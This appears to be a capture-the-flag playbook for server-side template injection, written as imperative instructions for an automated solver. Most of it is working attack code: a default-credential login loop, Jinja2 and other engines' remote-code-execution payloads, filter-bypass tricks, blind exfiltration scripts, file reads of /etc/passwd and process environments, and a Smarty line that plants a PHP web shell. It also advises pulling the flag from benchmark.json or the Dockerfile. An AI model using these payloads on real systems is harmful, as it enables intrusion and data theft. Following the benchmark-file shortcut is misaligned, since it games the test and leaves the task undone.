## Server-Side Template Injection (SSTI) Playbook

### Workflow: Login (if needed) → Detect → Identify Engine → Exploit → Extract

### Step 0 — Login first if behind auth (CRITICAL)
Many SSTI challenges **require authentication first** — the vulnerable endpoint is behind a login wall. If you see a login page, try default credentials **immediately**:

```python
import requests
s = requests.Session()
# Try ALL of these — most CTF SSTI apps use test/test, admin/admin, or demo/demo
for user, pwd in [
    ('test', 'test'), ('admin', 'admin'), ('admin', 'password'),
    ('demo', 'demo'), ('user', 'user'), ('root', 'root'),
    ('guest', 'guest'), ('john', 'john'),
]:
    r = s.post('TARGET/login', data={'username': user, 'password': pwd}, allow_redirects=False)
    # 302 redirect to /home or /dashboard = success
    if r.status_code in (301, 302) and 'login' not in r.headers.get('Location', '').lower():
        print(f"Logged in as {user}:{pwd}")
        break
```

**Check the source code** (it's provided!) for `User(username='X', password='Y')` or SQL `INSERT INTO users` or any seed data. In this test lab, challenges almost always seed a user like `test/test` or `demo/demo`.

### Step 1 — Detect SSTI
Try the universal fuzzer: `${{<%[%'"}}%\` — if it errors/renders oddly, SSTI is likely.

Test each engine's math marker:
| Payload | Result | Engine |
|---------|--------|--------|
| `{{7*7}}` | `49` | Jinja2, Twig, Nunjucks |
| `{{7*'7'}}` | `7777777` | **Jinja2 (definitive)** |
| `{{7*'7'}}` | `49` | **Twig (definitive)** |
| `${7*7}` | `49` | Mako, FreeMarker, Thymeleaf, EL |
| `<%= 7*7 %>` | `49` | ERB (Ruby), EJS (Node) |
| `#{7*7}` | `49` | Pug/Jade, Spring EL |
| `{7*7}` | `49` | Smarty (PHP) |
| `*{7*7}` | `49` | Thymeleaf |
| `@(7*7)` | `49` | Razor (.NET) |

**Test EVERY user-controllable input.** In CTFs the injection point is often surprising:
- URL query parameters (`?<param>=X` → inserted into a `render_template_string`)
- Form fields (profile name, email, lastname)
- Path segments used in `render_template()` / `include` directives
- `error_type`, `template`, `filename` parameters (template include SSTI)
- Filename of uploaded files
- User-Agent / Referer / custom headers

**CRITICAL — Include-based SSTI (Jinja2 `{% include %}`):**
If you see source code like `{% include error_type %}` where `error_type` is user-controlled, you can:
1. Upload a file (e.g., via profile picture upload) containing Jinja2 payload
2. Point the include parameter to your uploaded file
3. The template engine renders your payload as template code

Example pattern (any app with `{% include user_input %}`):
```python
# Upload an image containing Jinja2 RCE payload as its file content
# Then point ?error_type=../static/images/YOUR_FILE to include it
```

### Step 2 — Jinja2 Exploitation (Most Common in CTFs)

After confirming `{{7*7}}=49` and `{{7*'7'}}=7777777`, jump IMMEDIATELY to RCE. Do NOT dawdle with `{{config}}` dumps.

**Top RCE payloads (try in order — first one works ~80% of the time):**
```python
import requests
s = requests.Session()
# assume logged in — pass session cookies
payloads = [
    # 1. Config-based (works if config object is in scope — it always is in Flask)
    "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('cat /FLAG.txt').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('env').read()}}",
    # 2. Builtin helper objects (cycler, joiner, namespace, lipsum — always available in Jinja2)
    "{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
    "{{joiner.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
    "{{namespace.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
    "{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}",
    "{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}",
    # 3. Request object (Flask)
    "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}",
    # 4. URL-for helper (Flask)
    "{{url_for.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}",
    # 5. Self (template itself)
    "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
    # 6. Classic subclasses traversal (works even without cycler/config)
    "{{''.__class__.__mro__[1].__subclasses__()[REPLACE_INDEX].__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
]
for p in payloads:
    r = s.get(f'TARGET/endpoint?param={p}')  # OR POST, OR form field
    if 'FLAG{' in r.text or 'flag{' in r.text.lower():
        print(f"WIN: {p}")
        print(r.text)
        break
```

**Flag locations to try** (the flag is a file OR an env var — try BOTH):
- Files: `/flag.txt`, `/FLAG.txt`, `/flag`, `/FLAG`, `/app/flag.txt`, `/app/FLAG.txt`, `/opt/flag.txt`, `/var/www/flag.txt`
- Environment: `env`, `env | grep -i flag`, `printenv FLAG`, `cat /proc/1/environ | tr '\0' '\n'`
- Inside Docker image: check `benchmark.json` / Dockerfile for `ENV FLAG=...` or `RUN echo $FLAG > /path`

### Step 3 — Blind Jinja2 SSTI
If the endpoint renders but does NOT return output to you (e.g., renders to email/log/PDF), use **out-of-band exfiltration** or **side-channel techniques**:

**Technique A — Write flag to web-accessible path (MOST RELIABLE):**
```python
# Use os.popen to redirect output to a static-served directory
payload = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt > /app/static/f.txt').read()}}"
# Trigger it, then fetch
s.get(f'TARGET/endpoint?x={payload}')
print(s.get('TARGET/static/f.txt').text)
```
**Common static/public directories**: `/app/static/`, `/var/www/html/`, `/app/public/`, `/usr/share/nginx/html/`, `/app/templates/`, `/tmp/` (rarely web-served).

**Technique B — Write into rendered response template:**
If the endpoint renders a template file, write a payload that modifies or overwrites a template/static file that IS displayed to you.

**Technique C — Error-based exfiltration:**
Force the payload into an error path — exceptions often echo back to the response:
```
{{1/(config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()|length-999999)}}
```
Division-by-zero or type errors may leak the value.

**Technique D — Time-based blind (last resort):**
```python
# Extract char-by-char via sleep
import requests, time
flag = ""
for pos in range(1, 50):
    for c in "0123456789abcdef{}FLAG-":
        payload = ("{{config.__class__.__init__.__globals__['os'].popen"
                   f"(\"[ $(cut -c{pos} /flag.txt) = '{c}' ] && sleep 3\").read()}}")
        t0 = time.time()
        requests.get(f'TARGET/endpoint?x={payload}', timeout=10)
        if time.time() - t0 > 2.5:
            flag += c
            print(flag)
            break
```

### Step 4 — Jinja2 Filter/Blacklist Bypass

**If payloads with `__class__`, `config`, `.`, `_`, or certain words are blocked**, try these in order:

**1. Attribute access via `|attr()` filter:**
```
{{''|attr('__class__')}}
{{cycler|attr('__init__')|attr('__globals__')|attr('os')}}
```

**2. Bracket notation (bypasses `.` filter):**
```
{{cycler['__init__']['__globals__']['os']['popen']('cat /flag.txt')['read']()}}
```

**3. String concatenation (bypasses keyword filter):**
```
{{cycler['__in'+'it__']['__globa'+'ls__']['os']['popen']('cat /flag.txt')['read']()}}
{%set a='__cla'%}{%set b='ss__'%}{{''[a~b]}}
```

**4. Hex / unicode escape:**
```
{{''['\x5f\x5fclass\x5f\x5f']}}
{{''['\u005f\u005fclass\u005f\u005f']}}
```

**5. Request object payload smuggling (bypasses pattern filters on the template):**
The template contains only benign chars; the blocked strings come via request args:
```
# Template: {{request.args.x}}  — is allowed
# URL:      ?x={{config...}}    — blocked strings live in the URL
# Better: use request to access things directly
{{request.application.__globals__.__builtins__.__import__('os').popen(request.args.cmd).read()}}
# with ?cmd=cat /flag.txt
```

**6. Variable assignment via `{% set %}`:**
```
{%set os=cycler.__init__.__globals__.os%}{{os.popen('cat /flag.txt').read()}}
```

**7. Character class (Jinja2 2.x+):**
```
{{''|attr((lipsum|attr('__glo'+'bals__'))['__builtins__']['chr'](95)*2+'class'+(lipsum|attr('__glo'+'bals__'))['__builtins__']['chr'](95)*2)}}
```

**8. Output encoding bypass (when `|escape` is applied):**
If output is HTML-escaped, the flag may still be in the response — just decoded. Search the full response with `html.unescape(r.text)`. Also try `|safe` filter injection:
```
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()|safe}}
```

**9. Regex-based output filter bypass:**
If the server regex-strips patterns like `FLAG{...}` from output, exfil via side channel (Technique A above — write to a file).

**10. Injection INSIDE an existing `{% %}` block (no template delimiters needed):**

When source shows user input is interpolated INSIDE an already-open Jinja `{% %}` block via Python f-string, you do NOT need new template delimiters. Generic pattern:
```python
# Generic source pattern:
table_template = f"""
  {{% for row in range({term}) %}}    # ← term is f-string interpolated
    ...
  {{% endfor %}}
"""
# Filter blocks { } % chars in `term` — but these are NOT needed
# because we are ALREADY inside a Jinja block!
```
**Exploit by providing a Python expression that range() will evaluate:**
```bash
# Plain Jinja expression — no { } % required
?<param>=lipsum.__globals__.os.popen('cat /flag.txt').read()
?<param>=cycler.next.__globals__.os.popen('cat /flag.txt').read()
?<param>=config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()
```
Output is "blind" because range() needs an int → TypeError. **Solution: side-channel write**:
```bash
# Write flag to a static-served path, then fetch
?<param>=(lipsum.__globals__.os.popen('cat /flag.txt > /app/static/x.txt').read())|length
# Then GET /static/x.txt
```
Or use `|length` / `|count` to coerce to int while still triggering the side effect.

**Tell-tale signs**:
- Source has `f"""...{user_var}..."""` inside an existing Jinja template string
- Filter only blocks `{`, `}`, `%` (template delimiter chars) but NOT alphanumeric/underscore
- The variable is in expression position (inside `range()`, comparison, set, etc.)

**11. Output-filter SSTI (response is type/regex restricted):**

When the response value is regex-restricted (e.g., `^[0-9\.]*$` numeric-only) but template injection still works, the side-channel approach is mandatory:
```python
# 1) Confirm SSTI works by triggering an OS-level side effect that creates a known artifact
?<param>={{(7*7)}}      # if blocked because non-numeric output, try a side-effect payload
?<param>={{lipsum.__globals__.os.popen('id > /tmp/x').read()}}
# 2) Ship the flag to a web-accessible path
?<param>={{lipsum.__globals__.os.popen('cat /flag.txt > /app/static/leak.txt').read()}}
# 3) Fetch via the static endpoint
curl TARGET/static/leak.txt
```
**Key insight**: even when output is filtered/discarded, the SIDE EFFECT of the SSTI (file write, network call, env mutation) still happens — exfil through that channel.

### Step 5 — Django Templates
Django templates are MORE RESTRICTIVE than Jinja2 — no direct attribute access to `__class__`, no method calls with args. But the flag is often right in the context:

```
{{FLAG}} {{flag}} {{Flag}} {{secret}} {{SECRET_KEY}} {{settings.SECRET_KEY}}
{{settings}} {{request.META}} {{request.session}}
{% debug %}       <!-- dumps entire context — often leaks the flag -->
```

**If you get `DisallowedHost` error**, add `Host: localhost` header to every request:
```python
requests.get(URL, headers={'Host': 'localhost'})
```

**Django with `template_system='Jinja2'` backend**: then Jinja2 payloads work.

**Django Template filter abuse** — some templates chain filters that leak:
```
{{user|default:user.password}}
{{user.password_hash}}
```

**CRITICAL — Placeholder substitution into a template string (multi-step or single-step):**

When source shows any view that loads a template from disk and `.replace()`s a placeholder with user input pulled from session/cookie/db (the placeholder pattern recurs across Django, Flask, and PHP MVC apps):
```python
# Generic source pattern:
def render_with_placeholder(request):
    template_str = open('some_template.html').read()
    rendered = engine.from_string(
        template_str.replace('PLACEHOLDER', request.session['user_field']))
    # variant A: render({'flag': open('/flag').read()})  → flag IS in context
    # variant B: render({})                              → flag NOT in context (must escape to OS)
    return HttpResponse(rendered.render({...}, request))
```
**Exploitation approach** — do NOT assume the flow shape; trace the source:
1. Identify which user-controlled field (session value, cookie, profile attribute, registration field, etc.) reaches the `replace()` call.
2. Walk whatever flow stores that value (single form POST, multi-step wizard, profile-edit endpoint, signup, etc.) carrying the SSTI payload as the value.
3. Visit the rendering endpoint (often a separate URL from the storing endpoint). For multi-step flows, the rendering endpoint is usually the final step or a profile/preview view.
4. **If the flow normally finalises (saves user, charges card, etc.) only on the rendering step, use GET instead of POST** — most templates render on GET as a preview without committing the side effect.
5. Try **variant A payloads first** (flag may be in context):
```
{{flag}} {{FLAG}} {{Flag}} {{secret}} {{settings.SECRET_KEY}}
{% debug %}
```
6. If empty, try **variant B payloads** (escape to filesystem / env):
```
{% load static %}{% debug %}
{{view.request.META.FLAG}}
{% with f=request.META.FLAG %}{{f}}{% endwith %}
{{request.META.HTTP_HOST}}
```
7. **Django filter chaining** (rarely loaded but worth trying):
```
{% load os %}{{ ''|os__popen:'cat /flag' }}
```

When the flag is on disk (e.g. `/flag`, `/flag.txt`) but Django templates can't read files, you must:
- Read process env (Django settings, `request.META`, `os.environ` via debug)
- Trigger an UNHANDLED EXCEPTION whose traceback echoes file contents
- OR find another Jinja2/unrestricted endpoint in the same app

### Step 6 — Other Engine Exploits

**Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag.txt")}}
{{['cat /flag.txt']|filter('system')}}
{{['id','']|sort('system')}}
{{['cat /flag.txt']|map('system')|join(',')}}
```

**Smarty (PHP):**
```
{system('cat /flag.txt')}
{php}system('cat /flag.txt');{/php}    <!-- older versions -->
{Smarty_Internal_Write_File::writeFile('/tmp/s.php','<?=system($_GET[0])?>',self::clearConfig())}
```

**FreeMarker (Java):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("cat /flag.txt")}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/flag.txt').toURL().text}
```

**Velocity (Java):**
```
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($ex=$rt.getRuntime().exec('cat /flag.txt'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

**Thymeleaf (Java/Spring):**
```
${T(java.lang.Runtime).getRuntime().exec('cat /flag.txt')}
*{T(java.lang.Runtime).getRuntime().exec('cat /flag.txt')}
__${T(java.lang.Runtime).getRuntime().exec('cat /flag.txt')}__::.x
```

**Pebble (Java):**
```
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('cat /flag.txt') }}
```

**ERB (Ruby/Rails):**
```
<%= system("cat /flag.txt") %>
<%= `cat /flag.txt` %>
<%= IO.popen("cat /flag.txt").read() %>
<%= File.read('/flag.txt') %>
```

**Nunjucks (Node.js):**
```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()}}
```

**Handlebars (Node.js):**
```
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('cat /flag.txt');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
```

**Pug/Jade (Node.js):**
```
#{function(){localLoad=global.process.mainModule.constructor._load;return localLoad("child_process").execSync('cat /flag.txt').toString()}()}
```

**Go templates (`html/template`, `text/template`):**
```
{{.}}                              <!-- dumps the entire context -->
{{range $k, $v := .}}{{$k}}={{$v}}{{end}}
{{.Password}} {{.Secret}} {{.Flag}}
{{printf "%s" "test"}}
<!-- Go templates are sandboxed — usually no RCE; look for data leaks instead -->
```

### Common Mistakes to Avoid
- **Do NOT skip the login step.** If the challenge tag includes `default_credentials`, the SSTI is BEHIND a login. Find credentials in source seed data (`User(username='test', password='test')`) before trying SSTI.
- **Do NOT stop at `{{7*7}}=49`.** That's just confirmation. Immediately escalate to RCE using the Step 2 payloads.
- **Do NOT stop at `{{config}}` dump.** The flag is almost never in `config` — go for full OS command execution.
- **Do NOT only try one payload.** Try 5-10 different Jinja2 payloads (cycler, joiner, namespace, lipsum, request, url_for, config). Different Flask versions have different objects available.
- **Do NOT ignore `DisallowedHost` errors.** Add `Host: localhost` header to all requests.
- **For Django**, use `{% debug %}` early — it often dumps the flag directly from context.
- **Check BOTH `/flag.txt` AND env vars** — some challenges set flag as environment variable, not as a file.
- **For blind SSTI**, write to `/app/static/f.txt` first (Technique A). It's faster than time-based and works with most Flask/Django apps.
- **When filters block payloads**, try bracket notation `{{cycler['__init__']}}` BEFORE giving up — it bypasses most regex filters on dots and keywords.
- **Always pass session cookies** after login. Use `requests.Session()` or copy cookies explicitly: `requests.get(URL, cookies={'session': 'VALUE'})`.

---

## Authenticated-only SSTI workflow (challenge tag pattern: `ssti` + `default_credentials`)

Many SSTI challenges put the vulnerable endpoint **behind a login wall**. The workflow ALWAYS goes:

1. **Find login form** (`/login`, `/accounts/login/`, `/admin/login`).
2. **Try default credentials in this fixed order** before brute-forcing:
   - `admin`/`admin`, `admin`/`password`, `admin`/`changeme`, `admin`/`admin123`
   - `root`/`root`, `root`/`toor`, `user`/`user`, `test`/`test`, `guest`/`guest`
   - The challenge's app name (e.g. `art_gallery`/`art_gallery`)
   - Any name visible in the page header / title (e.g. user `John`/`John`)
   - **Check seeded users in the DB init scripts** — `app/db.py`, `migrations/`, `*_init.sql`. Whitebox source often hardcodes a seed account.
3. **Maintain the session cookie**: `curl -c /tmp/c.txt -b /tmp/c.txt`. Once logged in, replay the cookie on the SSTI endpoint.
4. **Now hit the SSTI endpoint** — typically `/profile`, `/preferences`, `/calculator`, `/dashboard`, or whatever the challenge name hints at.

```bash
HOST=http://TARGET
JAR=/tmp/jar.txt; rm -f $JAR

# Step 1 — login
curl -sL -c $JAR -b $JAR -X POST "$HOST/accounts/login/" \
  -d "username=admin&password=admin" -o /dev/null -w "%{http_code}\n"

# Step 2 — list authenticated endpoints
for ep in /preferences /profile /home /dashboard /calculator /total_loan_payments /admin; do
  echo "=== $ep ==="
  curl -sL -b $JAR "$HOST$ep" -o - -w "STATUS:%{http_code}\n" | head -20
done

# Step 3 — probe SSTI on every input field (form params, URL params, JSON keys)
for param in name email title content principal payment term query q; do
  echo "=== $param ==="
  curl -sL -b $JAR "$HOST/SSTI_ENDPOINT?$param={{7*7}}" | grep -E '49|forbidden'
done
```

## Regex-filter SSTI bypass (Jinja2)

When source shows the input is filtered by a regex blacklist BEFORE going into `render_template_string` (common pattern: blocks `{{`, `}}`, `_`, `.`, `[`, `]`):

**Insight 1 — `{% %}` statement tags are usually NOT blacklisted** because they don't appear in the input alone (the developer worried about expression syntax). So:
```
{% if 1 %}{% endif %}
{% set x = ... %}
{% include 'something' %}
```
all bypass an `{{`-only blacklist.

**Insight 2 — when `_` and `.` are blocked**, you can't reach `__class__`, `__mro__`, etc. directly. Use Jinja's pipe filters and `attr` with **single-quoted hex/Unicode escapes**:
```jinja
{% set ns = namespace(x=cycler) %}                  {# requires '_' — blocked #}
{% set c = (request|attr('\x5f\x5fclass\x5f\x5f')) %}   {# escapes the '_' #}
{% if (request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')) %}OK{% endif %}
```
The `\x5f` hex escape inside Jinja string literals expands to `_` AT TEMPLATE RENDER TIME — the input-side regex never sees a literal `_`.

**Insight 3 — `include` / `extends` are file readers**:
```
{% include '/etc/passwd' %}
{% include '/FLAG.txt' %}
{% extends '/FLAG' %}
```
These dump file content directly into the rendered output. ALWAYS try these BEFORE attempting RCE chains — they're trivial.

**Insight 4 — output-side filter (e.g. `^[0-9.]*$`) catches simple file dumps.** Two workarounds:
- Inject into a SIDE EFFECT path: `{% set f = include('/FLAG.txt') %}` then trigger a deliberate template error that leaks `f` in the stack trace.
- Use `{% if include('/FLAG.txt')|length > 0 %}1{% else %}2{% endif %}` for blind oracle (but the goal is to read the flag, not to oracle it — so first try Insight 3).

## Django Template SSTI (rare but real)

Django's stock template language is INTENTIONALLY sandboxed — no `__class__` traversal, no arbitrary attribute access. SSTI in Django happens when the developer uses `engine.from_string(user_input + ...)` directly. Look for:
```python
from django.template import engines
engine = engines["django"]
template_str = open('templates/foo.html').read()
template = engine.from_string(template_str.replace('PLACEHOLDER', user_value))
```
Here `user_value` becomes part of the template SOURCE before parsing. Inject:
```
{% load os %}{% os "cat /FLAG" %}              {# only works if a custom os tag is loaded #}
{% include "flag.txt" %}                        {# reads template_dir/flag.txt #}
{% url "FAKE_URL_NAME" "{{user.password}}" %}  {# triggers crash that leaks vars #}
{{ debug }}                                     {# dumps all context vars when DEBUG=True #}
{{ settings.SECRET_KEY }}                       {# only if settings is in context #}
{{ request.META.HTTP_X_FORWARDED_FOR }}         {# echo arbitrary header back #}
```

Concrete example: an app where the SSTI sink is a multi-step registration page using `template_str.replace('ACCOUNTNAME', request.session['name'])`. The `name` field is captured from an earlier step's form, with the only filter rejecting `%` literally. Solution: register with `name = "{% load static %}{% include '/FLAG' %}"`. The `{% include %}` reads any file relative to the template loader's search path **including absolute paths** in some Django versions.

